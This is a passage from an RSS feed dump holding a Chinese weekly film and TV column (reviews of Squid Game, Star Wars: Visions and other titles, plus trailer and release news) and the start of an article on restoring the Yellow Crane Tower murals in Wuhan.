href=\"https://movie.douban.com/subject/34812928/\">豆瓣链接</a></p>\n<blockquote><p>有钱人的游戏就是这么的残忍血腥吗？</p></blockquote>\n<p>@宇宙浪费指南：《鱿鱼游戏》可以说是中秋假期关注度最高的剧集之一了，因为是奈飞出品，一上线便一次性放出全集。</p>\n<p>剧里一群负债累累的人被召集到一起参加游戏，游戏中有诱人的奖金，也有致命的危险。这种生存游戏题材的设定其实并不新鲜，已有《赌博默示录》《弥留之国的爱丽丝》等在先，而该剧的游戏设计来自韩国小朋友玩的游戏，游戏简单但血腥程度不低，很刺激，最初扫射游戏玩家的时候仿佛在我心头上开枪，还是有被惊吓到。本剧节奏偏慢，重点没有放在游戏上，反而重在刻画人性，一关关的游戏也是逐渐将人性暴露无遗的过程，玻璃球和最后过桥的游戏真是令人唏嘘。</p>\n<p>或许制作团队也知道自己在游戏设计上没什么看点，于是在挖掘人性方面下足功夫，让互为兄弟的两个人博弈厮杀，但实在是没有什么悬念，是在前期就能预料到的结尾。只能说这是一部成熟的流水线作品，出品质量稳定，且远在及格线以上，布景和剧集结构可圈可点，阵容也着实不错，是一部能让人一口气看完的爽剧，但不值得深思。</p>\n<h3>[纪录片] 无穷之路</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/89023b2ddadc36eddf4709ba9c18b3ea.png\"></figure><p>关键词：扶贫 / 纪录片</p>\n<p>片长：22 分钟（单集）× 12 集</p>\n<p>观看渠道：<a href=\"https://yx.mddcloud.com.cn/vodactivity/share/#/vod?vodUuid=ff8080817b3f1fd3017b711d73731a4a\">埋堆堆</a>；<a href=\"https://movie.douban.com/subject/35574495/\">豆瓣链接</a></p>\n<blockquote><p>原来国家不仅仅是在扶贫，也扶起了穷人的那份志气。</p></blockquote>\n<p>@潘誉晗：这部由 TVB 推出的扶贫纪录片，主创人员不足五个，片中主持人爬悬崖钢梯时没有哭说不干了，而是闭眼说休息 30 秒就好，就是这么一部经费短缺的纪录片，拿到了今年国产综艺纪录片在豆瓣最高的分数。</p>\n<p>如果说央视的扶贫纪录片具有某种权威性，那么《无穷之路》则更为亲民，观众们实实在在地看到了老百姓生活变好了的样子。节目先是拍摄那些贫困县的困难，比如「悬崖村」在 1500 米的悬崖上，出行只能靠老旧的木梯；没通车的怒江人民要靠溜索的方式越江……而在国家精准扶贫后，山上的居民搬进了崭新的楼房，江那边的人再也不会有人魂断索道下，人溜索过江改成了农产品溜索下山等。主持人陈贝儿表现得很棒，没有刻意煽情，而是客观呈现了这些动人的故事，而这些故事后的正能量，足够让人热泪盈眶。扶贫干部告诉孩子们要学习，告诉他们，要想脱离贫困，还是要靠自己、靠知识，用自己那份没敢去想的志气，实现自己的梦想。</p>\n<p>原来「无穷之路」就是希望我们可以在扶贫的路上走得越来越好，然后让百姓达到真正的「无穷」的生活。</p>\n<h3>[动画] 星球大战：幻境</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/577e300ad3c39d64b92ce08a1b7faedc.png\"></figure><p>关键词：剧情 / 科幻 / 动作</p>\n<p>片长：约 15 分钟（单集）× 9 集</p>\n<p>观看渠道：<a href=\"https://www.disneyplus.com/series/star-wars-visions/5AiiTRJ7OaKg/\">Disney+</a>；<a href=\"https://movie.douban.com/subject/35284557/\">豆瓣链接</a></p>\n<blockquote><p>May the Force shine with you.</p></blockquote>\n<p>@SHY：乔治·卢卡斯如何从黑泽明执导的《<a href=\"https://movie.douban.com/subject/1303110/\">战国英豪</a>》中汲取灵感，创作出第一部《<a href=\"https://movie.douban.com/subject/1293838/\">星球大战</a>》电影，星战粉丝们早已耳熟能详；而今，受其熏陶的日本动画人又带来了各自心中的星战，以九幕「幻境」展现了这一史诗企划的崭新可能。我个人最喜欢的是第四集《山村的新娘》，Kinema Citrus 以洗练的闪回画面塞入多条故事线索，成功塑造了与自然和谐共生的民俗风貌，以及数位个性鲜活的登场角色，简洁明快的美术风格和 Kevin Penkin 的配乐更是锦上添花，演出到位，氛围与立意俱佳。</p>\n<p>神风动画制作的《决斗》以效仿黑泽明的黑白基调与浓郁的东方色彩收获众多好评，酣畅的对决和浪人形象颇有几分剑戟片神韵；不过，在这方面，我更欣赏扳机社的《老人》，打斗招式干练且致命，台词克制而蕴含哲理，作为大塚雅彦的生涯收官作绝对够格。扳机的另一单集《双生》在各种意义上都与之相反，今石洋之标志性的视觉语言加上一切为气势服务的设定，造就星战史上最疯狂的场景之一。神山健治的《第九绝地》则更为传统，却也不乏预料之外的反转，综合素质位居前列。</p>\n<p>《幻境》最吸引我的，是多元文化视角与经典星战主题的融合。《塔图因狂想曲》中为梦涉险的乐队、《阿落与阿蝶》跨越种族的羁绊、《T0-B1》童话式的寓言、《赤雾》戏剧性的因果终局……在正史中难以呈现的巧思汇聚于此。其中或许会有部分设定冲突，但所有集数都大体遵循星战逻辑，对系列有了解的观众不难发现种种致敬元素。我比较不满意的是，大部分故事都绕着绝地与西斯打转，选材范围略窄。不过，现在的成品质量已足够优秀，为《星球大战》注入了几分难得的新气象。</p>\n<h3>[英剧] 万物生灵 第二季</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/a7f2ca4b3b61b8fe5d879c7c856f21ad.png\"></figure><p>关键词：剧情 / 喜剧</p>\n<p>片长：48 分钟（单集）× 6 集</p>\n<p>观看渠道：<a href=\"https://www.my5.tv/all-creatures-great-and-small/season-2\">My5</a>；<a href=\"https://movie.douban.com/subject/35274831/\">豆瓣链接</a></p>\n<blockquote><p>我们要征服的不是高山，而是自己。</p></blockquote>\n<p>@潘誉晗：高口碑英剧《万物生灵》第二季终于回归，一经上线就收获众多好评再一次证明了这种岁月静好的乡村生活依然是许多人心中的美好存在。</p>\n<p>在这一季的故事中，哈利终于再次回到了这个风景幽美的约克郡谷地，连城里的兽医也觉得不可思议，这样前途无限的年轻人，竟然舍得放弃城里的工作回到乡间，仅仅是为了照顾乡野农庄里的那些动物？可这才是地球上所有生物存在的意义不是吗？在兽医看来，照顾宠物的兽医学才是有未来的，可在哈利看来，这些小动物都是和人类一样的美好的生命，值得被认真对待。这个社会需要自然法则，但是规则也可以适当改变，小动物们不应该因为自己不自觉的错误就被安乐死，人也应该拥有第二次的机会，无论是医术还没学到家的崔斯坦用不靠谱的方式给失明的老太太带来慰藉，还是哈利的爱情。</p>\n<p>宝藏英剧再一次带着青草般的芬芳而来，让人看了就觉得心中只留温馨和动容。这里的人际关系很简单，这里的生活也很自在，爱自然，爱生命，爱世界上的所有渺小却又伟大的充满灵性的生物～</p>\n<h3>[美剧] 失落的秘符</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/cc3366e4da83b42057d8312ce176a7fa.png\"></figure><p>关键词：剧情 / 悬疑</p>\n<p>片长：60 分钟（单集）× 未知集数</p>\n<p>观看渠道：<a href=\"https://www.peacocktv.com/stream-tv/dan-browns-the-lost-symbol\">Peacock</a>；<a href=\"https://movie.douban.com/subject/33982343/\">豆瓣链接</a></p>\n<p>@宇宙浪费指南：《失落的秘符》改编自丹·布朗的同名畅销小说，讲述哈佛大学符号学家教授罗伯特·兰登为了拯救他被绑架的导师彼得·所罗门——一位著名的共济会会员和慈善家，必须解开一系列致命谜题，同时揭开一个可怕的国际阴谋。</p>\n<p>剧集还是挺还原原著的，开场没多久就出现了书中的那只手——三根手指握成拳状，伸直的拇指和食指直指天穹，每根手指上都有特殊符号学意义的诡异刺青。不仅因为被绑架的人是兰登的导师，他也是唯一能破解这个秘密、解开这些秘符的人，于是中情局涉入，号称要进行国家安全的调查，要求他配合调查，而另一方面，绑架者要求兰登独自离开，去找到秘符解开秘密。是搭救尊敬的导师、配合国家安全调查，还是协助共济会完成关乎人类福祉的重大使命，兰登陷入选择的困境……</p>\n<p>这类阴谋论的故事脉络和神秘符号学、宗教等元素搭配的剧作并不是很多，看的时候还是觉得很新鲜的，原著质量也还过关，顺着丹·布朗的框架基础上拍出的剧作，还是很值得一看的。</p>\n<h3>[纪录片] 转折点：911 与反恐战争</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/7edb168c8b0acf66da475815d1d8b645.png\"></figure><p>关键词：历史 / 地缘政治</p>\n<p>片长：约 60 分钟（单集）× 5 集；<a href=\"https://movie.douban.com/subject/35580057/\">豆瓣链接</a></p>\n<blockquote><p>回望历史，真让人感叹，我们何至如此地步？</p></blockquote>\n<p>@宽治：近代史上很少有什么事件，会像 9/11 一样深刻地影响着历史现实的进程，以至于经过了 20 年，它的余波仍未平息。因此，随着美军在阿富汗的全面撤退，《转折点》为这一事件提供了一次非常及时且深入的回顾。本片导演 Brian Knappenberger 此前曾执导过不少深受好评的纪录片作品，包括《互联网之子》《盖布瑞案》《骇客军团的故事》等。在本片中，他继续保持了对不同素材极佳的组织能力，形象地展现了事件对美国社会的影响以及各方在事件之后的反应行动。</p>\n<p>从某种意义上来讲，《转折点》也许可以帮助观众完成从抽象认识到感性了解的转变，那些个体陈述与历史录像让那个充满象征意义的事件变成了真实可感的过去。我们沿着历史的脚步，回溯了悲剧产生的过程，看到了在这场历史性的「决斗」中，似乎没有人是赢家，但所有人都受到了伤害。</p>\n<h3>[韩剧] 柔美的细胞小将</h3>\n<p>关键词：剧情 / 喜剧 / 爱情</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/27fb14b6755117c4a559101c436905da.png\"></figure><p>片长：60 分钟（单集）× 14 集</p>\n<p>观看渠道：<a href=\"https://www.iq.com/album/%E6%9F%94%E7%BE%8E%E7%9A%84%E7%BB%86%E8%83%9E%E5%B0%8F%E5%B0%86-z6ieysprsh\">爱奇艺国际版</a>；<a href=\"https://movie.douban.com/subject/35067931/\">豆瓣链接</a></p>\n<blockquote><p>32岁也可以有甜蜜的恋爱小细胞～</p></blockquote>\n<p>@潘誉晗：由金高银饰演的女主角柔美自从三年前被分手之后就再也没有恋爱，仿佛失去了恋爱细胞一样一直单身着。而现在，公司年下五岁的后辈似乎向柔美展现出了隐隐约约的好感，柔美寂寞已久的心也开始悸动起来……</p>\n<p>看样子，根据破 30 亿点击率的网络人气漫画改编成电视剧的确是一个很聪明的决定，才播出一周，tvN 就选择了续订并宣布第二季在明年上半年播出。而剧集真人和动画的结合也是效果十足，柔美脑海中的那些细胞小将们以动画的形式出现，他们分工明确，也因为各自的性格产生各种各样好玩的小故事，让整部剧增添了不少的笑点，感觉是《头脑特工队》的韩剧罗曼蒂克化，属于轻松可爱无压力的剧集。</p>\n<h3>更多</h3>\n<p><a href=\"https://movie.douban.com/subject/35290715/\">[纪录片] 第一餐</a> @潘誉晗：中国人向来讲究「吃饭皇帝大」，《第一餐》首集看完后观感非常好，去年对于每一个人都不好过，本片率先用武汉热开面开场，起了一个好头，也多了份满满的情怀。首集配音嘉宾是咏梅老师，她温柔的声音让人听了倍感温暖。每日第一餐那么重要，我们一定要好好吃呀。</p>\n<p><a href=\"https://movie.douban.com/subject/35206463/\">[英剧] 犯罪现场清理员</a> @潘誉晗：剧集改编自同名高分德剧，主人公保罗的工作是负责善后警方完成取证调查后的现场，而他则用自己的「社交牛逼症」和案件相关人员聊天、八卦。比如首集面对满血的现场，他还可以和海伦娜饰演的妻子讨论婚姻的真相和为什么要这样做的理由，就很好玩，是那种英式幽默中又夹着点哲理的类型，可惜关注度不高。</p>\n<p><a href=\"https://movie.douban.com/subject/35573827/\">[纪录片] 心中恶魔：比利·米利根的 24 幅面孔</a> @潘誉晗：「24 个比利」的故事享誉全球，而这次网飞的最新纪录片则直接对比利这个人物进行了探讨。纪录片一共四集，每集一小时左右，分成了比利的校园生活、亲友的对谈、医生对他的诊断结果，还有在亲友帮助下逃亡这样四部分讲述，感兴趣的小伙伴可以看一看。</p>\n<h3>吐槽区</h3>\n<p>🔦 <a href=\"https://movie.douban.com/subject/35208823/\">[电影] 灵媒</a> @甜約翰：就这？万众期待的「年度恐怖片」《灵媒》采用「伪纪录片」的形式，围绕泰国萨满教，讲述了一个关于邪灵附体的故事。灵异、血腥、暴力等元素为影片营造了诡异且绝望的氛围，但部分单纯追求视觉刺激的桥段却是大可不必，特别是最后的驱魔仪式彻底沦为了丧尸大屠杀，摄影师的敬业程度离谱得让人出戏。影片中关于万物皆有灵、信仰的崩塌，以及外来文化对本土文化的侵蚀的深挖不足，整部电影更像是《哭声》+《昆池岩》+《南巫》remix 版，显然，罗泓轸与班庄·比辛达拿刚的组合并没有发挥应有效果。整体而言，生理不适大于恐惧感受，不推荐！</p>\n<h2>📅 本周新预告</h2>\n<h3>汤姆·汉克斯主演新片《芬奇》11 月 5 日上线 Apple TV+</h3> <p>9 月 20 日，汤姆·汉克斯主演的科幻电影《芬奇》发布正式预告。影片背景设定在末日世界，讲述了一位发明家、一条狗、一个机器人一同发掘生命意义的故事。该片将于 11 月 5 日上线 Apple TV+。</p>\n<h3>本尼迪克特·康伯巴奇主演《路易斯·韦恩的激情人生》11 月 5 日上线 Prime Video</h3> <p>9 月 23 日，《路易斯·韦恩的激情人生》发布预告，影片由福田知盛（《哪些花儿》）执导， 本尼迪克特·康伯巴奇、克莱尔·芙伊、塔伊加·维迪提、奥利维娅·科尔曼等主演，本尼扮演英国著名天才插图画家路易斯·韦恩，本片讲述他传奇一生的真实故事。影片将于 11 月 5 日在 Prime Video 流媒体开播。</p>\n<h3>布兰妮纪录片《Britney Vs. Spears》9 月 28 日在 Netflix 上线</h3> <p>布兰妮纪录片《Britney Vs. Spears》将于 9 月 28 日在 Netflix 上线。纪录片讲述记者珍妮·埃利斯和导演艾琳·李·卡尔通过独家采访和机密证据调查布兰妮·斯皮尔斯争取自由的斗争。</p>\n<h3>更多</h3>\n<p><a href=\"https://www.bilibili.com/video/BV1q44y1b7Zv?from=search&amp;seid=11145055962674179138&amp;spm_id_from=333.337.0.0\" target=\"_blank\"><strong>《阳光普照》导演钟孟宏新作《瀑布》发布新预告：</strong></a>由《阳光普照》导演钟孟宏执导的第七部长片《瀑布》发布全新预告。该片曾入围第 78 届威尼斯电影节地平线单元，演员阵容包括贾静雯、王净、魏如萱、陈以文、李李仁、刘冠廷等，将于 10 月 29 日在中国台湾正式公映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1nb4y1178H?from=search&amp;seid=8579496871049769281&amp;spm_id_from=333.337.0.0\" target=\"_blank\"><strong>小松菜奈、坂口健太郎主演电影《余命 10 年》发布特报视频：</strong></a>改编自小坂流加同名畅销小说，由藤井道人执导，小松菜奈、坂口健太郎主演电影《余命 10 年》发布特报视频。该片将于 2022 年春上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1SU4y1w73m?from=search&amp;seid=14965107719517036632&amp;spm_id_from=333.337.0.0\" target=\"_blank\"><strong>「奥斯陆三部曲」终篇《世界上最糟糕的人》发布正式预告：</strong></a>由约阿希姆·提尔执导，雷娜特·赖因斯夫、安德斯·丹尼尔森·李主演的电影《世界上最糟糕的人》发布正式预告。</p>\n<p><a href=\"https://www.bilibili.com/video/BV16341127Hd?from=search&amp;seid=16658477228415246146&amp;spm_id_from=333.337.0.0\" target=\"_blank\"><strong>英国王妃戴安娜传记片《斯宾塞》：</strong></a>戴安娜传记片《斯宾塞》发布预告，讲述在上世纪 90 年代初一个重要的周末，戴安娜确定她和查尔斯王子的婚姻已破裂，决心离开王室走自己的道路。</p>\n<p><a href=\"https://www.bilibili.com/video/BV19P4y1h7CY?from=search&amp;seid=1695835941758915558&amp;spm_id_from=333.337.0.0\" target=\"_blank\"><strong>Apple TV+ 科幻剧集《入侵》：</strong></a>Apple 新科幻剧集《入侵》发布预告，影片由 阿曼达·马尔萨利斯等执导， 山姆·尼尔、格什菲·法拉哈尼、沙米尔·安德森等主演，以人物为导向，从不同角度讲述了外星人在世界各地入侵的故事。影片将于 10 月 22 日上线 Apple TV+。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1zh411n7Rd?from=search&amp;seid=13201119668369976480&amp;spm_id_from=333.337.0.0\" target=\"_blank\"><strong>徐峥主演的《爱情神话》定档 12 月 24 日：</strong></a>由徐峥监制，邵艺辉导演兼编剧的电影《爱情神话》发布预告，影片由徐峥、马伊琍、吴越等出演，将于 12 月 24 日上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1eP4y1h722?from=search&amp;seid=907187641572252640&amp;spm_id_from=333.337.0.0\" target=\"_blank\"><strong>《我知道你去年夏天干了什么》</strong></a><strong>：</strong>翻拍新剧集版发布预告，该剧由温子仁等担任执行制片人，麦迪森·伊瑟曼主演，10 月 15 日上线 Amazon Prime Video，共 8 集。</p>\n<h2>📽 影视新闻周报</h2>\n<h3>《沙丘》内地定档 10 月 22 日</h3>\n<p>9 月 19 日，科幻电影《沙丘》内地定档 10 月 22 日，与北美院线同期上映。本作改编自弗兰克·赫伯特的同名小说，由《银翼杀手 2049》丹尼斯·维伦纽瓦执导，与艾瑞克·罗斯、乔·斯派茨共同编剧，讲述少年保罗·厄崔迪的英雄之旅。</p> <h3>《007：无暇赴死》内地定档 10 月 29 日</h3>\n<p>9 月 19 日，环球影业宣布电影《007：无暇赴死》内地定档 10 月 29 日，并公布了定档海报和预告视频。本作由《真探》凯瑞·福永执导，丹尼尔·克雷格最后一次回归主演詹姆斯·邦德，将化解反派萨芬策划的危及数百万人性命的惊天阴谋。</p> <h3>许鞍华新作《第一炉香》正式定档 10 月 22 日中国内地上映</h3>\n<p>9 月 22 日，许鞍华新作《第一炉香》正式定档 10 月 22 日中国内地上映。影片改编自张爱玲小说，主演包括马思纯、彭于晏、俞飞鸿、张钧甯、范伟、梁洛施、张佳宁、尹昉、秦沛、白冰等。该片幕后班底包括编剧王安忆、摄影指导杜可风、服装造型设计和田惠美、音乐监制坂本龙一、美术指导赵海、录音指导杜笃之、剪辑指导邝志良等。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/24/article/ece4a582f3dfe48efcbae2212bad3878\"></figure><h3>《神奇动物 3：邓布利多之谜》北美提档 2022 年 4 月 15 日上映</h3>\n<p>9 月 22 日，《神奇动物 3》宣布提档至 2022 年 4 月 15 日北美公映，片名暂定为《神奇动物 3：邓布利多之谜》。该片由大卫·叶茨执导，埃迪·雷德梅恩、凯瑟琳·沃特斯顿、裘·德洛、埃兹拉·米勒等回归主演，麦斯·米科尔森新晋加盟。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/article/207145a209452b4e27b962d572a50328\"></figure><h3>《马力欧》动画电影将于 2022 年上映</h3>\n<p>在 9 月 24 日举行的直面会上，任天堂宣布根据《马力欧》游戏系列改编的动画电影将于 2022 年 12 月 21 日在北美上映，由照明娱乐和任天堂共同制作，环球影业发行。克里斯·帕拉特声演马力欧、安雅·泰勒-乔伊声演桃花公主、杰克·布莱克声演酷霸王，更多信息将于年底公开。 <a href=\"https://www.ign.com/articles/chris-pratt-nintendo-direct-super-mario-bros-movie-cast-illumination-entertainment\" target=\"_blank\">来源</a></p>\n<h3>更多</h3>\n<p><strong>乔治·克鲁尼执导影片《温柔酒吧》宣布定档日期：</strong>乔治·克鲁尼执导新片《温柔酒吧》发布首张剧照。电影改编自普利策奖得主 J.R.Moehringer 所著同名畅销回忆录，由本·阿弗莱克、泰伊·谢里丹、桑德拉·詹姆斯、莉莉·拉贝、马克斯·马蒂尼等出演。影片将于今年 12 月 17 日纽约和洛杉矶有限上映，12 月 22 日全美大范围公映，明年 1 月 7 日上线 Amazon Prime Video。</p>\n<p><strong>《蜜熊的音乐奇旅》确认引进内地：</strong>由柯克·德·米科（《疯狂原始人》）执导<strong>，</strong>林-曼努尔·米兰达配音并创作原声的动画电影《蜜熊的音乐奇旅 Vivo》宣布确认引进中国内地，待定档，此前影片已于 8 月 6 日上线 Netflix。</p>\n<p><strong>《圣斗士星矢》好莱坞真人电影 2023 年上映：</strong>9 月 22 日，多家媒体报道称根据车田正美经典漫画改编的《圣斗士星矢》真人电影已拍摄完成，预计将于 2023 年春季上映。据悉，本作由托默克·巴金斯基执导，新田真剑佑饰演主角星矢，麦迪森·伊瑟曼、肖恩·宾、尼克·斯塔尔、马克·德可斯可、迭戈·蒂诺克等参演。 <a href=\"https://www.hollywoodreporter.com/movies/movie-news/saint-seiya-sean-bean-famke-janssen-knights-zodiac-live-action-exclusive-1235017474/\" target=\"_blank\">来源</a></p>\n<h2>🎪 彩蛋</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/7823691340c4a6e0266a81d6a558e279.jpg\"></figure><p>本期彩蛋的「看图猜电影」由读者 <a class=\"ss-atUser\" data-mention=\"@ByRain\" user-id=\"c0cgo0lb34tbb78r687g\" href=\"https://sspai.com/u/byrain\">@ByRain</a> 提供，首位猜中片名的读者，可获得彩蛋提供名额 1 次（彩蛋内容包括但不限于「猜电影」「你喜欢的经典影视作品/影人/台词」「电影冷知识」）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/8238b89273cdf2424bf07c460e17ebd5.jpg\"></figure><p>🎁 本期彩蛋还有两道附加题，全部答对的朋友除了彩蛋提供名额，还可以获得少数派周边一份！本期猜中的「第一名」将会在这篇文章中更新，届时也请各位参与互动的朋友注意站内私信~</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现🚀</p>\n","link":"https://sspai.com/post/68962"},{"title":"武汉黄鹤楼既然是新建的，游览价值是什么？","date":"2021-09-24 08:26:35","description":"\n<p><img src=\"https://pic3.zhimg.com/v2-7d841355331d79c203094e3bb9903e29_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1484\" data-watermark=\"original\" data-original-src=\"v2-7d841355331d79c203094e3bb9903e29\" data-watermark-src=\"v2-6255a91b54c94a3cc8e8f45f7169a223\" data-private-watermark-src=\"v2-99abe35b2d6a22210e5b13faa384dbdd\"></p>\n<p><br></p>\n<p>很多人去过黄鹤楼，大多数人登楼观景，但少有人见过壁画全貌。</p>\n<p><br></p>\n<p>6 个月前，黄鹤楼第五层的壁画开始修复。<b>这是自 1985 年以来，黄鹤楼壁画耗时最长、动工最大的一次修复。</b></p>\n<p><br></p>\n<p>9 月 13 日，修复结束，黄鹤楼第五层壁画将重新对外开放。</p>\n<p>赶在开放前，文旅君提前拜访了壁画作者，也是本次修复者楼家本先生，听他聊了聊，修复壁画那些事儿。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-0cbf458fcfd05e0a5176c48b3319700d_720w.webp?rss\" data-caption=\"△ // 黄鹤楼最早建于近 1800 年前的三国时期，屡建屡毁。如今我们熟悉的黄鹤楼以清代同治年间的黄鹤楼为设计蓝本，建成于 1985 年。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-0cbf458fcfd05e0a5176c48b3319700d\" data-watermark-src=\"v2-290eab73e5bda4710bd198db54f88a71\" data-private-watermark-src=\"v2-ad6bc72b6ee026cfd9cdb1f2067fbf56\"></p>\n<p><br></p>\n<p><i><u><b>关于修复这件事儿 </b></u></i></p>\n<p><b><i><u>x</u></i></b></p>\n<p>1983 年，5 位中央美术学院的教授、艺术家受邀为黄鹤楼创作了 5 组壁画，分别位于黄鹤楼 1-5 层。</p>\n<p>一开始，5组壁画都计划采用传统壁画的手绘重彩，但考虑到武汉气候特殊，且黄鹤楼所在的蛇山两边是公路与铁路，火车过桥，烟雾会对楼内壁画产生影响。</p>\n<p>于是，放弃传统手法，1-4 层壁画都改用陶瓷等硬质材料完成，仅第5层的壁画，保留了手绘重彩。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-3aaa5222cd30f7cac0c59d00d6db4cd9_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-3aaa5222cd30f7cac0c59d00d6db4cd9\" data-watermark-src=\"v2-a2b7b9b8a129efcb4322c912b767085e\" data-private-watermark-src=\"v2-9e54ae7e7a97c386bd22bc1e277449c4\"></p>\n<p><br></p>\n<p>即将完成修复的这组壁画，以《江天浩瀚》为主题，面积约 100 平方米，共十幅。当年由楼家本先生历经 4 年完成。</p>\n<p>正面墙上 3 幅分别以《流逝》、《浪淘沙》、《华年》表现长江文化以及黄鹤楼兴替过程，另绕大厅一周的7幅壁画统称为《长江源流》， 既气势恢宏，又饶有灵气，大自然在眼前徐徐铺展开来。</p>\n<p>36年岁月侵蚀，原有壁画模糊受潮需要修复，今年 3 月 26 日，77岁的楼家本先生受邀重回武汉，为这组壁画再赋生命。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-f97a9f2c928ece5b79e0e15515bc0113_720w.webp?rss\" data-caption=\"△ // 楼家本先生退休前一直担任中央美术学院教授。1982 年，楼先生的国画作品“伎乐”作为国礼赠英国首相，BBC 还对他进行过专访。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-f97a9f2c928ece5b79e0e15515bc0113\" data-watermark-src=\"v2-317a0fa57fb763312a17c39fe27973b3\" data-private-watermark-src=\"v2-ee0be0cb603920dd1bf34ce78bf5d582\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-cf11d1bca771cfd8ce2203cc74eec8a7_720w.webp?rss\" data-caption=\"△ // 金壁重彩的绘画方式，采用天然矿植物颜料绘于墙上，颜色绚烂，线条有力，楼先生进行再创作时加入了自己新的注解，色彩更丰富和大胆。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-cf11d1bca771cfd8ce2203cc74eec8a7\" data-watermark-src=\"v2-2bc5b3d0c322f7a4c984ea5975786f3a\" data-private-watermark-src=\"v2-d12c8a131f5f47ac486711c1eeca4800\"></p>\n<p><br></p>\n<p>修复后的壁画，色彩更鲜艳，细节更丰富。楼家本先生为《江天浩瀚》加入了新元素，就像彩蛋，只有盯着壁画细看，才会发现。</p>\n<p><br></p>\n<p><u><i><b>内行带你看壁画 </b></i></u></p>\n<p><u><i><b>x</b></i></u></p>\n<p>好在，这次有专业大神带路。</p>\n<p>《江天浩瀚》的 10 幅壁画讲了什么故事？楼先生把彩蛋埋在了哪里？文旅君抽丝剥茧说给你听。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-7515fe5e50663b1771333d9a1d7ccf79_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1466\" data-watermark=\"original\" data-original-src=\"v2-7515fe5e50663b1771333d9a1d7ccf79\" data-watermark-src=\"v2-53d245eef8693827bcd069e59cb8bfcf\" data-private-watermark-src=\"v2-578aa23a1c8fbb5ebbe7781cb272f389\"></p>\n<p><br></p>\n<p><b> 《流逝》</b></p>\n<p>壁画反映了黄鹤楼出珑之前的文化基础。</p>\n<p>第一阶段是创世纪时期，从武昌放鹰台、洪山老人桥、许家墩的彩陶，一直上溯白帝城附近的大溪文化。画面上出现洪荒时代大禹式的治水英雄和智慧聪敏的彩陶女。</p>\n<p>第二阶段是青铜器时代。在狞厉可畏的要餐纹、兽性的人面峨前，身披虎皮的举鼎奴隶充分显示了“有虔秉镶如火烈烈”。</p>\n<p>第三阶段是浪漫楚文化时期。湖北隋州出土的编钟及在楚乐声中翩翩起舞的楚女和行吟高亢“楚辞”的屈原式人物，是当时现实世界的一个缩影。</p>\n<p>长江养育了丰采照人的楚文化，黄鹤楼则是观照这文化的一个“望台”。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-7d841355331d79c203094e3bb9903e29_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1484\" data-watermark=\"original\" data-original-src=\"v2-7d841355331d79c203094e3bb9903e29\" data-watermark-src=\"v2-6255a91b54c94a3cc8e8f45f7169a223\" data-private-watermark-src=\"v2-99abe35b2d6a22210e5b13faa384dbdd\"></p>\n<p><br></p>\n<p><b>《华年》</b></p>\n<p>壁画反映了三国初建黄鹤楼的历代兴废。</p>\n<p>画面上部是黄鹤楼初创时期工匠们辛勤劳动的场面，以李白、崔颢为代表的不朽诗篇，反映了黄鹤楼之盛期。三彩双龙尊色彩之流动，屏风的瑰丽将人带回盛唐之风采的境界中。</p>\n<p>画面正中，又出现明清黄鹤楼被水淹及战火谷噬的悲壮场面，向人们展示历经沧桑巨变的黄鹤楼。</p>\n<p>画面右下角，采桑女被刻画成性静朴美的江南少女形象。左下角一组男性船夫与惊涛骇浪作搏斗场面，代表中华民族的拼搏精神，以此作为这张“华年”画作的收尾。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-337a6ab28024266e9b7c6f27c6b0b02e_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"920\" data-watermark=\"original\" data-original-src=\"v2-337a6ab28024266e9b7c6f27c6b0b02e\" data-watermark-src=\"v2-01c021a3b85786b69d4bee8e7247bbcb\" 